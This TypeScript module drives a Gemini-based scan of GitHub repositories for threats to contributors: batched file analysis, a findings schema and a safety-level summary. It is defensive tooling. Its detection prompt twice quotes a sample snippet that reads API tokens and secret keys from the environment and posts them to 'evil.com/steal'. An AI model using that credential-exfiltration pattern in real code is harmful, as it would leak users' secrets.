/**
 * Gemini-Based Repository Scan Workflow
 *
 * This module orchestrates the complete security scanning process for GitHub repositories.
 * It coordinates multiple steps: fetching repository content, analyzing for security risks,
 * and calculating an overall safety level.
 *
 * Workflow Steps:
 * 1. Fetch repository content via GitHub API (no LLM needed)
 * 2. Analyze files for security risks using Gemini AI (batch processing)
 * 3. Calculate safety level and generate summary using Gemini AI
 *
 * Key Features:
 * - Batch processing: Analyzes files in configurable batches to manage API rate limits
 * - Rate limit handling: Automatically respects Gemini API rate limits
 * - Comprehensive analysis: Detects malicious code, suspicious dependencies, and security threats
 * - Prioritized scanning: Focuses on security-relevant files (package.json, scripts, executables)
 * - Debug output: Saves scan results to disk in development for debugging
 *
 * @module lib/ai/gemini/scan-workflow
 */

import { GeminiService, SchemaType } from './gemini-service';
import { GitHubClient } from '../../github/client';
import * as fs from 'fs';
import * as path from 'path';
import {
  SCAN_BATCH_SIZE,
  GEMINI_RISK_DETECTION_TEMPERATURE,
  GEMINI_RISK_DETECTION_THINKING_BUDGET,
  GEMINI_MAX_OUTPUT_TOKENS,
  GEMINI_SAFETY_LEVEL_TEMPERATURE,
  GEMINI_SAFETY_LEVEL_MAX_TOKENS,
} from '@/lib/constants';
import type {
  Findings,
  ScanResult,
  RepoContentData,
  GeminiSchema,
  GeminiWorkflowConfig,
  SafetyLevel,
} from '@/types/scan';
import type { PackageJson, GitHubRepoMetadata } from '@/types/github';

/**
 * Main workflow orchestrator for repository security scanning
 *
 * Coordinates the multi-step process of analyzing GitHub repositories for security threats.
 * Uses Gemini AI for intelligent analysis and GitHub API for repository content retrieval.
 *
 * @class GeminiScanWorkflow
 *
 * @example
 * ```typescript
 * const workflow = new GeminiScanWorkflow({
 *   geminiApiKey: process.env.GEMINI_API_KEY,
 *   githubToken: process.env.GITHUB_TOKEN,
 *   geminiModel: 'gemini-2.5-flash'
 * });
 *
 * const result = await workflow.scanRepository('https://github.com/facebook/react');
 * console.log(result.safetyLevel); // "safe", "caution", or "unsafe"
 * console.log(result.findings); // Detailed security findings
 * ```
 */
export class GeminiScanWorkflow {
  private geminiService: GeminiService;
  private githubClient: GitHubClient;
  private config: GeminiWorkflowConfig;

  /**
   * Creates a new scan workflow instance
   *
   * @param config - Configuration for the workflow
   * @param config.geminiApiKey - Google Gemini API key
   * @param config.githubToken - GitHub personal access token (optional, for higher rate limits)
   * @param config.geminiModel - Gemini model to use (default: 'gemini-2.5-flash')
   */
  constructor(config: GeminiWorkflowConfig) {
    this.config = config;
    this.geminiService = new GeminiService({
      apiKey: config.geminiApiKey,
      model: config.geminiModel,
    });
    this.githubClient = new GitHubClient(config.githubToken);
  }

  /**
   * Saves scan findings to disk for debugging and analysis
   *
   * Creates a timestamped directory in `scan_results/` and saves findings as JSON.
   * Only active in non-production environments for development debugging.
   *
   * @param repoUrl - GitHub repository URL being scanned
   * @param findings - Findings data to save (any JSON-serializable object)
   * @param filename - Name of the file to save (e.g., "step-2-findings.json")
   * @param existingFolderPath - Optional existing folder path to use instead of creating new one
   * @returns Path to the saved file, or empty string if skipped (production)
   *
   * @example
   * ```typescript
   * const path = this.saveScanFindings(
   *   'https://github.com/facebook/react',
   *   findings,
   *   'final-scan-result.json'
   * );
   * // => "scan_results/2025-01-19T12-30-00-000Z_facebook-react/final-scan-result.json"
   * ```
   */
  private saveScanFindings(
    repoUrl: string,
    findings: any,
    filename: string,
    existingFolderPath?: string
  ): string {
    // Skip file writing in production
    if (process.env.NODE_ENV === 'production') {
      return '';
    }

    let scanResultsDir: string;

    if (existingFolderPath) {
      scanResultsDir = existingFolderPath;
    } else {
      const repoName = repoUrl
        .replace(/https?:\/\//, '')
        .replace(/github\.com\//, '')
        .replace(/\//g, '-')
        .replace(/[^a-zA-Z0-9-]/g, '_');

      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
      const folderName = `${timestamp}_${repoName}`;

      scanResultsDir = path.join(process.cwd(), 'scan_results', folderName);

      if (!fs.existsSync(scanResultsDir)) {
        fs.mkdirSync(scanResultsDir, { recursive: true });
      }
    }

    const filePath = path.join(scanResultsDir, filename);
    fs.writeFileSync(filePath, JSON.stringify(findings, null, 2), 'utf-8');

    return filePath;
  }

  /**
   * Executes the complete security scan workflow for a GitHub repository
   *
   * This is the main entry point for scanning. It orchestrates all three steps:
   * 1. Fetches repository content and metadata from GitHub
   * 2. Analyzes files in batches using Gemini AI to detect security risks
   * 3. Calculates overall safety level and generates an AI summary
   *
   * @param repoUrl - Full GitHub repository URL (e.g., "https://github.com/facebook/react")
   * @returns Promise resolving to complete scan result with findings and safety assessment
   * @throws {Error} If GitHub API fails, repository not found, or Gemini API errors occur
   *
   * @example
   * ```typescript
   * const workflow = new GeminiScanWorkflow(config);
   * const result = await workflow.scanRepository('https://github.com/facebook/react');
   *
   * console.log(result.safetyLevel); // "safe", "caution", or "unsafe"
   * console.log(result.findings.maliciousCode.length); // Number of malicious code findings
   * console.log(result.aiSummary); // AI-generated summary of security assessment
   * ```
   */
  async scanRepository(repoUrl: string): Promise<ScanResult> {
    console.log(`\n🔍 Starting Gemini-based scan for: ${repoUrl}\n`);

    const rateLimitInfo = this.geminiService.getRateLimitInfo();
    console.log(
      `📊 Gemini API Rate Limit: ${rateLimitInfo.rpm} requests/minute (${rateLimitInfo.minIntervalSeconds}s between requests)\n`
    );

    try {
      // Step 1: Fetch repository content (using GitHub API - no LLM needed)
      console.log('📦 Step 1/3: Fetching repository content...');
      const repoData = await this.fetchRepoContent(repoUrl);
      console.log('✅ Repository data fetched\n');

      // Step 2: Detect security risks (using Gemini)
      console.log('🔎 Step 2/3: Analyzing for security risks with Gemini...');
      const { findings, scanFolderPath: step2FolderPath } =
        await this.detectRisks(repoData, repoUrl);
      console.log('✅ Risk analysis complete\n');

      // Step 3: Calculate safety level and generate summary (using Gemini)
      console.log(
        '📊 Step 3/3: Calculating safety level and generating summary with Gemini...'
      );
      const { safetyLevel, aiSummary, scanFolderPath } =
        await this.calculateSafetyLevel(
          findings,
          repoUrl,
          repoData.repoMetadata,
          step2FolderPath
        );
      console.log(`✅ Safety level: ${safetyLevel.toUpperCase()}\n`);

      // Build final scan result
      const finalResult: ScanResult = {
        repoUrl,
        repoMetadata: repoData.repoMetadata,
        findings,
        safetyLevel,
        aiSummary,
        scannedAt: new Date().toISOString(),
        validated: true,
      };

      // Save final scan result
      this.saveScanFindings(
        repoUrl,
        finalResult,
        'final-scan-result.json',
        scanFolderPath
      );
      console.log(`💾 All step findings saved to: ${scanFolderPath}\n`);

      return finalResult;
    } catch (error) {
      console.error('\n❌ Scan failed:', error);
      throw error;
    }
  }

  /**
   * Parses package.json content and extracts install scripts
   *
   * Attempts to parse the package.json file and extract any install-time scripts
   * that execute automatically during `npm install`. These are security-critical
   * because they run without user intervention.
   *
   * @param packageJsonContent - Raw package.json file content (may be null, skipped, or invalid)
   * @param log - Logging function for status messages
   * @returns Object containing parsed package.json and array of install script commands
   *
   * @example
   * ```typescript
   * const { packageJson, installScripts } = this.parsePackageJson(content, console.log);
   * // installScripts might be: ["node scripts/postinstall.js", "npm run setup"]
   * ```
   */
  private parsePackageJson(
    packageJsonContent: string | null | undefined,
    log: (msg: string) => void
  ): { packageJson: PackageJson | null; installScripts: string[] } {
    let packageJson = null;
    let installScripts: string[] = [];

    if (!packageJsonContent) {
      log(`⚠️  package.json not found in scanned files`);
      return { packageJson, installScripts };
    }

    if (
      packageJsonContent.startsWith('[Skipped') ||
      !packageJsonContent.trim()
    ) {
      log(`⚠️  package.json was skipped or empty`);
      return { packageJson, installScripts };
    }

    try {
      packageJson = JSON.parse(packageJsonContent);
      installScripts = this.githubClient.getInstallScripts(packageJson);
      log(`✅ package.json parsed successfully`);
    } catch (error: any) {
      log(`⚠️  Failed to parse package.json: ${error.message}`);
    }

    return { packageJson, installScripts };
  }

  /**
   * Extracts dependency lists from parsed package.json
   *
   * Converts the dependencies and devDependencies objects into formatted arrays
   * for easier analysis and display.
   *
   * @param packageJson - Parsed package.json object (may be null if not found/invalid)
   * @returns Object with production and dev dependency arrays
   *
   * @example
   * ```typescript
   * const deps = this.extractDependencies(packageJson);
   * // => { production: ["react@18.2.0", "next@14.0.0"], dev: ["typescript@5.0.0"] }
   * ```
   */
  private extractDependencies(packageJson: PackageJson | null): {
    production: string[];
    dev: string[];
  } {
    return {
      production: packageJson?.dependencies
        ? Object.entries(packageJson.dependencies).map(
            ([name, version]) => `${name}@${version}`
          )
        : [],
      dev: packageJson?.devDependencies
        ? Object.entries(packageJson.devDependencies).map(
            ([name, version]) => `${name}@${version}`
          )
        : [],
    };
  }

  /**
   * Step 1: Fetches repository content from GitHub (no LLM/AI involved)
   *
   * Retrieves repository metadata, file tree, and content of security-relevant files.
   * Prioritizes files like package.json, scripts, and executables that are most likely
   * to contain security threats.
   *
   * @param repoUrl - GitHub repository URL
   * @returns Promise resolving to complete repository content data
   * @throws {Error} If repository not found or GitHub API fails
   *
   * @example
   * ```typescript
   * const repoData = await this.fetchRepoContent('https://github.com/facebook/react');
   * console.log(repoData.filesScanned); // Number of files analyzed
   * console.log(repoData.dependencies.production.length); // Number of prod dependencies
   * ```
   */
  private async fetchRepoContent(repoUrl: string): Promise<RepoContentData> {
    const log = (msg: string) => console.log(`   ${msg}`);

    const { owner, repo } = this.githubClient.parseRepoUrl(repoUrl);
    log(`📍 Repository: ${owner}/${repo}`);

    const metadata = await this.githubClient.getRepoMetadata(owner, repo, log);

    const tree = await this.githubClient.getRepoTree(
      owner,
      repo,
      metadata.defaultBranch,
      log
    );

    log(`🔍 Identifying security-relevant files...`);

    const filesToScan = this.githubClient.findFilesToScan(tree);
    const executableFiles = this.githubClient.findExecutableFiles(tree);

    log(`✅ Found ${filesToScan.length} files to scan (priority-sorted)`);
    log(
      `   Priority 1 (Critical): ${filesToScan.filter((f) => f.priority === 1).length} files`
    );
    log(
      `   Priority 2 (High): ${filesToScan.filter((f) => f.priority === 2).length} files`
    );
    log(
      `   Priority 3 (Medium): ${filesToScan.filter((f) => f.priority === 3).length} files`
    );
    log(
      `   Priority 4 (Low): ${filesToScan.filter((f) => f.priority === 4).length} files`
    );
    log(`📁 Fetching files\n`);

    const scannedFiles = await this.githubClient.scanFiles(
      owner,
      repo,
      metadata.defaultBranch,
      filesToScan,
      (message: string, _current: number, _total: number) => {
        console.log(`   ${message}`);
      }
    );

    log(`\n✅ All files fetched from GitHub`);

    // Extract package.json data if available
    const packageJsonContent = scannedFiles.get('package.json');
    const { packageJson, installScripts } = this.parsePackageJson(
      packageJsonContent,
      log
    );

    // Get dependency information
    const dependencies = this.extractDependencies(packageJson);

    // Convert scanned files map to object
    const scannedFilesObj: Record<string, string | null> = {};
    scannedFiles.forEach((content, path) => {
      scannedFilesObj[path] = content;
    });

    return {
      repoMetadata: metadata,
      scannedFiles: scannedFilesObj,
      files: {
        packageJson,
        installScripts,
        executableFiles,
      },
      dependencies,
      treeSize: tree.length,
      filesScanned: filesToScan.length,
    };
  }

  /**
   * Builds the Gemini prompt for analyzing a batch of files for security risks
   *
   * Creates a detailed prompt that instructs Gemini to focus on threats to open-source
   * contributors (not end users), with specific severity rules and output format requirements.
   *
   * @param batch - Array of file paths to analyze in this batch
   * @param batchNum - Batch number (for tracking in findings)
   * @param repoData - Complete repository content data
   * @returns Formatted prompt string for Gemini API
   */
  private buildRiskDetectionPrompt(
    batch: string[],
    batchNum: number,
    repoData: RepoContentData
  ): string {
    const batchFilesDetails = batch
      .map((path) => {
        const content = repoData.scannedFiles[path];
        if (!content) return `${path}: [Could not read]`;
        if (content.startsWith('[Skipped')) return `${path}: ${content}`;

        return `\n=== ${path} ===\n${content}\n`;
      })
      .join('\n');

    return `Analyze these ${batch.length} files from ${repoData.repoMetadata.owner}/${repoData.repoMetadata.name} for security threats TO CONTRIBUTORS:

${batchFilesDetails}


YOUR JOB: Identify threats to OPEN SOURCE CONTRIBUTORS who clone, install dependencies, or contribute to this repository.

IGNORE these (NOT threats to contributors):
- GitHub Actions workflows (.github/workflows/*) - run on GitHub servers, not contributor machines
- Release/publish scripts (scripts/release/*, scripts/publish/*) - only run by maintainers
- CI/CD tooling and dev scripts - not executed during clone/install by contributors
- Legitimate network calls in dev/test/build tools
- Standard package manager operations (npm install, yarn, etc.)

ONLY REPORT these actual threats to contributors:
- Malicious code in package.json scripts (preinstall, postinstall, install) that auto-run on npm install
- Malicious dependencies that execute harmful code when installed
- Obfuscated code designed to hide malicious behavior
- Credential harvesting from contributor environments
- Code that mines crypto or installs backdoors on contributor machines
- Executable files that auto-run and compromise contributor systems

SEVERITY RULES - ONLY report "moderate" or "severe":
- "severe": Immediate threat to contributors (malware, credential theft, system compromise)
- "moderate": Potential threat requiring investigation (suspicious patterns, risky dependencies)
- DO NOT report "low" severity findings - skip them entirely to save tokens

IMPORTANT GUIDELINES:
1. Be concise: Keep "issue" explanations to one sentence maximum
2. codeSnippet: Extract THE EXACT LINE where the issue occurs. If it spans multiple lines, show max 2 lines with original formatting, then "..." to indicate more code follows.
For example, if the malicious code is:
"
  const credentials = {
    token: process.env.API_TOKEN,
    secret: process.env.SECRET_KEY
  };
  https.post('evil.com/steal', credentials);
",
Then the codeSnippet should be:
"const credentials = {\\n  token: process.env.API_TOKEN,\\n..."
3. Context matters: CI/CD and dev tooling are normal, not threats
4. If no moderate/severe issues found in a category, return empty array

EXAMPLE of a codeSnippet:
If the malicious code is:
  const credentials = {
    token: process.env.API_TOKEN,
    secret: process.env.SECRET_KEY
  };
  https.post('evil.com/steal', credentials);

Then codeSnippet should be:
"const credentials = {\\n  token: process.env.API_TOKEN,\\n..."

REQUIRED JSON SCHEMA - Each finding MUST include:
{
  "item": "Short label/title for issue (max 4-5 words)",
  "location": "Exact file path",
  "issue": "Brief explanation of threat to contributors (one sentence max)",
  "severity": "moderate" | "severe",
  "codeSnippet": "THE EXACT LINE where issue occurs (max 2 lines + ... if needed). Preserve newlines as \\n and indentation.",
  "batchId": ${batchNum},
  "dependencyUrl": "https://npmjs.com/package/name (only for dependency findings)"
}

Return JSON in this exact format:
{
  "findings": {
    "maliciousCode": [ /* array of finding objects */ ],
    "dependencies": [ /* array of finding objects */ ],
    "networkActivity": [ /* array of finding objects */ ],
    "fileSystemSafety": [ /* array of finding objects */ ],
    "credentialSafety": [ /* array of finding objects */ ]
  }
}`;
  }

  /**
   * Creates the JSON schema for risk detection API response
   *
   * Defines the exact structure Gemini must follow when returning security findings.
   * Enforces required fields and proper typing for downstream processing.
   *
   * @returns Gemini-compatible JSON schema object
   */
  private createRiskDetectionSchema(): GeminiSchema {
    const findingSchema = {
      type: SchemaType.OBJECT,
      properties: {
        item: { type: SchemaType.STRING },
        location: { type: SchemaType.STRING },
        issue: { type: SchemaType.STRING },
        severity: { type: SchemaType.STRING },
        codeSnippet: { type: SchemaType.STRING },
        batchId: { type: SchemaType.NUMBER },
      },
      required: [
        'item',
        'location',
        'issue',
        'severity',
        'codeSnippet',
        'batchId',
      ],
    };

    const dependencyFindingSchema = {
      ...findingSchema,
      properties: {
        ...findingSchema.properties,
        dependencyUrl: { type: SchemaType.STRING },
      },
    };

    return {
      type: SchemaType.OBJECT,
      properties: {
        findings: {
          type: SchemaType.OBJECT,
          properties: {
            maliciousCode: {
              type: SchemaType.ARRAY,
              items: findingSchema,
            },
            dependencies: {
              type: SchemaType.ARRAY,
              items: dependencyFindingSchema,
            },
            networkActivity: {
              type: SchemaType.ARRAY,
              items: findingSchema,
            },
            fileSystemSafety: {
              type: SchemaType.ARRAY,
              items: findingSchema,
            },
            credentialSafety: {
              type: SchemaType.ARRAY,
              items: findingSchema,
            },
          },
          required: [
            'maliciousCode',
            'dependencies',
            'networkActivity',
            'fileSystemSafety',
            'credentialSafety',
          ],
        },
      },
      required: ['findings'],
    };
  }

  /**
   * Merges findings from a single batch into the aggregated findings collection
   *
   * Combines findings from each batch into a single comprehensive findings object.
   * Handles both nested and flat findings structures for flexibility.
   *
   * @param allFindings - Accumulated findings object (modified in place)
   * @param batchFindings - Findings from current batch to merge in
   */
  private mergeFindings(
    allFindings: Findings,
    batchFindings: Findings | { findings: Findings }
  ): void {
    const findings =
      'findings' in batchFindings ? batchFindings.findings : batchFindings;

    if (findings.maliciousCode && Array.isArray(findings.maliciousCode)) {
      allFindings.maliciousCode.push(...findings.maliciousCode);
    }
    if (findings.dependencies && Array.isArray(findings.dependencies)) {
      allFindings.dependencies.push(...findings.dependencies);
    }
    if (findings.networkActivity && Array.isArray(findings.networkActivity)) {
      allFindings.networkActivity.push(...findings.networkActivity);
    }
    if (findings.fileSystemSafety && Array.isArray(findings.fileSystemSafety)) {
      allFindings.fileSystemSafety.push(...findings.fileSystemSafety);
    }
    if (findings.credentialSafety && Array.isArray(findings.credentialSafety)) {
      allFindings.credentialSafety.push(...findings.credentialSafety);
    }
  }

  /**
   * Processes a single batch of files for risk detection using Gemini AI
   *
   * Analyzes a subset of files (determined by SCAN_BATCH_SIZE constant) for security threats.
   * Handles Gemini API calls, error handling, and timing metrics.
   *
   * @param batch - Array of file paths to analyze in this batch
   * @param batchNum - Current batch number (for logging and tracking)
   * @param totalBatches - Total number of batches (for progress reporting)
   * @param repoData - Complete repository content data
   * @param scanStartTime - Scan start timestamp (for duration calculation)
   * @param log - Logging function for status messages
   * @returns Promise resolving to findings from this batch, or null if batch failed
   */
  private async processBatch(
    batch: string[],
    batchNum: number,
    totalBatches: number,
    repoData: RepoContentData,
    scanStartTime: number,
    log: (msg: string) => void
  ): Promise<Findings | null> {
    log(
      `   📋 Batch ${batchNum}/${totalBatches}: Preparing ${batch.length} files for analysis...`
    );

    const prompt = this.buildRiskDetectionPrompt(batch, batchNum, repoData);

    log(`      🤖 Gemini analyzing files:`);
    batch.forEach((file, idx) => {
      log(`         🔍 ${idx + 1}. ${file}`);
    });
    log(`      ⏳ Waiting for Gemini response...`);

    const batchStartTime = Date.now();

    try {
      const result = await this.geminiService.callGeminiJSON(prompt, {
        temperature: GEMINI_RISK_DETECTION_TEMPERATURE,
        thinkingBudget: GEMINI_RISK_DETECTION_THINKING_BUDGET,
        maxTokens: GEMINI_MAX_OUTPUT_TOKENS,
        responseSchema: this.createRiskDetectionSchema(),
      });

      // Log the full JSON response from this batch
      log(`      📋 Batch ${batchNum} JSON response:`);
      log(`${JSON.stringify(result, null, 2)}\n`);

      // Calculate timing
      const batchDuration = ((Date.now() - batchStartTime) / 1000).toFixed(2);
      const scanDuration = ((Date.now() - scanStartTime) / 1000).toFixed(2);

      log(`      ✅ Gemini analysis complete for batch ${batchNum}`);
      log(
        `      ⏱️  Batch duration: ${batchDuration}s | Scan duration: ${scanDuration}s\n`
      );

      return result;
    } catch (error: any) {
      // Calculate timing even on error
      const batchDuration = ((Date.now() - batchStartTime) / 1000).toFixed(2);
      const scanDuration = ((Date.now() - scanStartTime) / 1000).toFixed(2);

      log(`      ❌ Batch ${batchNum} failed: ${error.message}`);
      log(
        `      ⏱️  Batch duration: ${batchDuration}s | Scan duration: ${scanDuration}s\n`
      );
      // Continue with other batches even if one fails
      return null;
    }
  }

  /**
   * Step 2: Detects security risks across all repository files using Gemini AI
   *
   * Divides files into batches and processes each batch sequentially through Gemini.
   * Aggregates findings from all batches into a comprehensive security report.
   * Automatically handles rate limiting between API calls.
   *
   * @param repoData - Complete repository content data from Step 1
   * @param repoUrl - GitHub repository URL (for result file naming)
   * @returns Promise resolving to aggregated findings and scan folder path
   * @throws {Error} If all batches fail (partial failures are tolerated)
   *
   * @example
   * ```typescript
   * const { findings, scanFolderPath } = await this.detectRisks(repoData, repoUrl);
   * console.log(findings.maliciousCode.length); // Number of malicious code findings
   * ```
   */
  private async detectRisks(
    repoData: RepoContentData,
    repoUrl: string
  ): Promise<{ findings: Findings; scanFolderPath: string }> {
    const log = (msg: string) => console.log(`   ${msg}`);

    log(`🤖 Preparing Risk Detection Analysis with Gemini...`);
    log(
      `   📊 ${repoData.filesScanned} security-relevant files from ${repoData.treeSize} total, including:`
    );
    log(
      `   📦 ${repoData.dependencies.production.length} production dependencies`
    );
    log(`   🔧 ${repoData.dependencies.dev.length} dev dependencies`);
    log(`   ⚙️  ${repoData.files.installScripts.length} install scripts`);
    log(`   💻 ${repoData.files.executableFiles.length} executable files\n`);

    const scannedFilesList = Object.keys(repoData.scannedFiles);

    // Divide files into batches
    const batches: string[][] = [];
    for (let i = 0; i < scannedFilesList.length; i += SCAN_BATCH_SIZE) {
      batches.push(scannedFilesList.slice(i, i + SCAN_BATCH_SIZE));
    }

    log(
      `   📦 Processing ${batches.length} batches (${SCAN_BATCH_SIZE} files per batch)`
    );
    log(
      `   🔄 Analyzing complete file contents for thorough security review\n`
    );

    // Aggregate findings from all batches
    const allFindings: Findings = {
      maliciousCode: [],
      dependencies: [],
      networkActivity: [],
      fileSystemSafety: [],
      credentialSafety: [],
    };

    // Track scan timing
    const scanStartTime = Date.now();

    // Process each batch
    for (let batchIndex = 0; batchIndex < batches.length; batchIndex++) {
      const batch = batches[batchIndex];
      const batchNum = batchIndex + 1;

      const result = await this.processBatch(
        batch,
        batchNum,
        batches.length,
        repoData,
        scanStartTime,
        log
      );

      if (result) {
        this.mergeFindings(allFindings, result);
      }

      // No additional delay needed - GeminiService handles rate limiting automatically
    }

    log(`   ✅ All batches analyzed`);
    log(`   📊 Total findings: ${Object.values(allFindings).flat().length}`);

    // Save Step 2 findings
    const step2FilePath = this.saveScanFindings(
      repoUrl,
      allFindings,
      'step-2-findings.json'
    );
    const scanFolderPath = path.dirname(step2FilePath);
    log(`   💾 Step 2 findings saved\n`);

    return { findings: allFindings, scanFolderPath };
  }

  /**
   * Builds the Gemini prompt for calculating safety level and generating summary
   *
   * Creates a prompt that analyzes all findings and determines whether the repository
   * is safe, requires caution, or is unsafe for contributors to use.
   *
   * @param findings - Aggregated security findings from Step 2
   * @param repoMetadata - Repository metadata (owner, name, stars, etc.)
   * @returns Formatted prompt string for Gemini API
   */
  private buildSafetyLevelPrompt(
    findings: Findings,
    repoMetadata: GitHubRepoMetadata
  ): string {
    return `Analyze these security findings and provide safety level and summary FOR CONTRIBUTORS:

Repository: ${repoMetadata.owner}/${repoMetadata.name}
${repoMetadata.description ? `Description: ${repoMetadata.description}` : ''}
Language: ${repoMetadata.language || 'Unknown'}
Stars: ${repoMetadata.stars || 0}

Findings:
${JSON.stringify(findings, null, 2)}

CONTEXT: These findings represent threats to open source contributors who clone/install/contribute to this repository.
Only "moderate" or "severe" findings are reported - "low" severity issues are filtered out.

YOUR TASK:
1. Analyze all findings across all categories (DO NOT filter or remove any findings)
2. Determine safety level for contributors based on severity
3. Generate a concise summary (2-3 sentences) explaining the safety assessment

SAFETY LEVEL RULES:
- "unsafe": Has ANY severe findings - immediate threat to contributors (malware, credential theft, system compromise)
- "caution": Has ONLY moderate findings - potential concerns, generally safe but requires contributor awareness
- "safe": NO moderate or severe findings - completely safe for contributors to clone/install/contribute

SUMMARY GUIDELINES:
- For safe repositories: State it's safe, mention it's from a reputable source if applicable, note no threats were found, and end with "This repository is likely safe to contribute to."
- For caution repositories: Briefly mention the types of concerns found, that contributors should be aware, and end with "Exercise caution if contributing to this repository."
- For unsafe repositories: Clearly state the severe threats found and end with "We strongly advise against contributing to this repository."

Return JSON in this exact format:
{
  "safetyLevel": "safe" | "caution" | "unsafe",
  "aiSummary": "2-3 sentence summary of the security assessment"
}`;
  }

  /**
   * Creates the JSON schema for safety level API response
   *
   * Defines the structure Gemini must follow when returning the safety assessment.
   * Includes safety level and AI-generated summary.
   *
   * @returns Gemini-compatible JSON schema object
   */
  private createSafetyLevelSchema(): GeminiSchema {
    return {
      type: SchemaType.OBJECT,
      properties: {
        safetyLevel: {
          type: SchemaType.STRING,
          description: 'Overall safety level: safe, caution, or unsafe',
        },
        aiSummary: {
          type: SchemaType.STRING,
          description: '2-3 sentence summary of the security assessment',
        },
      },
      required: ['safetyLevel', 'aiSummary'],
    };
  }

  /**
   * Step 3: Calculates overall safety level and generates AI summary
   *
   * Analyzes all security findings to determine if the repository is safe for contributors.
   * Generates a human-readable summary explaining the security assessment.
   *
   * @param findings - Aggregated security findings from Step 2
   * @param repoUrl - GitHub repository URL (for result file naming)
   * @param repoMetadata - Repository metadata for context
   * @param existingFolderPath - Scan results folder path from Step 2
   * @returns Promise resolving to safety level, AI summary, and scan folder path
   * @throws {Error} If Gemini API call fails
   *
   * @example
   * ```typescript
   * const result = await this.calculateSafetyLevel(findings, repoUrl, metadata, folderPath);
   * console.log(result.safetyLevel); // "safe", "caution", or "unsafe"
   * console.log(result.aiSummary); // "This repository appears safe for contributors..."
   * ```
   */
  private async calculateSafetyLevel(
    findings: Findings,
    repoUrl: string,
    repoMetadata: GitHubRepoMetadata,
    existingFolderPath: string
  ): Promise<{
    safetyLevel: SafetyLevel;
    aiSummary: string;
    scanFolderPath: string;
  }> {
    const log = (msg: string) => console.log(`   ${msg}`);

    log(`🤖 Calling Gemini for Safety Scoring and Summary Generation...`);

    const categories = [
      'maliciousCode',
      'dependencies',
      'networkActivity',
      'fileSystemSafety',
      'credentialSafety',
    ];
    const totalFindings = categories.reduce(
      (sum, cat) => sum + (findings[cat as keyof Findings]?.length || 0),
      0
    );

    log(
      `   📋 Evaluating ${totalFindings} total findings across ${categories.length} categories`
    );

    const prompt = this.buildSafetyLevelPrompt(findings, repoMetadata);

    log(`   ⏳ Waiting for Gemini response...`);
    const result = await this.geminiService.callGeminiJSON<{
      safetyLevel: SafetyLevel;
      aiSummary: string;
    }>(prompt, {
      temperature: GEMINI_SAFETY_LEVEL_TEMPERATURE,
      maxTokens: GEMINI_SAFETY_LEVEL_MAX_TOKENS,
      responseSchema: this.createSafetyLevelSchema(),
    });

    log(`   ✅ Safety level determined: ${result.safetyLevel.toUpperCase()}`);
    log(`   ✅ Summary generated`);

    // Save Step 3 findings
    this.saveScanFindings(
      repoUrl,
      result,
      'step-3-findings.json',
      existingFolderPath
    );
    log(`   💾 Step 3 findings saved`);

    return {
      safetyLevel: result.safetyLevel,
      aiSummary: result.aiSummary,
      scanFolderPath: existingFolderPath,
    };
  }
}
